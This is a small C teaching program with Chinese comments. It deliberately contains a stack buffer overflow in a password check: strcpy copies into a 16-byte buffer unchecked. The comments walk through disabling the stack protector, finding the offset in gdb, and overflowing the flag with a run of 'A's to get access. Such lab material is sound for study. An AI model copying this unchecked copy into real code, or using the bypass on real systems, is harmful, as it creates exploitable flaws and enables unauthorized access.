#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/**
 * 1 gcc -fno-stack-protector  -g -o auth auth_overflow.c
 *  gcc堆栈保护会：1）flag的地址在pass_buff的低地址，使得pass_buff无法覆盖flag
 *               2）会提前保存函数的返回地址，一旦通过shellcode篡改，报__stack_chk_fail
 * 2 gdb auth
 *   break 17 (strcpy(pass_buff,pass);)
 *   run <any_params>
 *   获得pass_buff和flag地址,并求其差值->16
 *          x/s pass_buff 
 *          x/x &flag
 *     
 * 3  ./auth_overflow AAAAAAAAAAAAAAAAAA
 *   根据上一步得到的16，这里取17-20个A。确保既可以覆盖flag，又不至于覆盖其他地址以免出现问题。
 */
int check(char* pass){
    int flag=0;
    char pass_buff[16];

    strcpy(pass_buff,pass);
    if(strcmp(pass_buff,"admin")==0){
        flag=1;
    }
    if(strcmp(pass_buff,"root")==0){
        flag=1;
    }
    return flag;
}

int main(int argc,char* argv[]){
    if(argc<2){
        printf("usage: %s <password>\n",argv[0]);
        exit(0);
    }
    if(check(argv[1])){
        printf("access granted!\n");
    }
    return 0;
}
